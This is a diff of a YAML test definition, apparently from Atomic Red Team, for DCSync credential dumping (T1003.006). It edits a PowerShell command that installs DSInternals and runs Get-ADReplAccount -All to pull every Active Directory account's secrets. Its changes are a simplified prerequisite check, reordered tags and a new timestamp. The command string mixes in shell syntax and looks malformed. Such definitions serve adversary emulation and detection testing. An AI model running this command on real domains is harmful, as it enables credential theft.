@@ -11,9 +11,9 @@
     windows:
       psh:
         command: '$RequiredModule = Get-Module -Name DSInternals -ListAvailable; if
-          (-not $RequiredModule) {exit 1}; if (-not $RequiredModule.ExportedCommands[''DSInternals''])
-          {exit 1} else {exit 0}; then : ; else Install-Module -Name DSInternals -Scope
-          CurrentUser -Force; fi; Get-ADReplAccount -All -Server $ENV:logonserver.TrimStart("\")'
+          (-not $RequiredModule) {exit 1} else {exit 0}; then : ; else Install-Module
+          -Name DSInternals -Scope CurrentUser -Force; fi; Get-ADReplAccount -All
+          -Server $ENV:logonserver.TrimStart("\")'
         elevation_required: false
   plugin: atomic
   singleton: false
@@ -22,8 +22,8 @@
   privilege: ''
   buckets:
   - t1003.006
-  - credential-access
   - atomic-red-team
+  - credential-access
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -37,10 +37,7 @@
         '
       prereq_command: '$RequiredModule = Get-Module -Name DSInternals -ListAvailable
 
-        if (-not $RequiredModule) {exit 1}
-
-        if (-not $RequiredModule.ExportedCommands[''DSInternals'']) {exit 1} else
-        {exit 0}
+        if (-not $RequiredModule) {exit 1} else {exit 0}
 
         '
       get_prereq_command: 'Install-Module -Name DSInternals -Scope CurrentUser -Force
@@ -48,4 +45,4 @@
         '
     technique_created: '2020-02-11T18:45:34.293Z'
     atomic_guid: a0bced08-3fc5-4d8b-93b7-e8344739376e
-    import_timestamp: '2026-03-23T04:30:10.688222Z'
+    import_timestamp: '2026-03-24T04:18:27.705334Z'
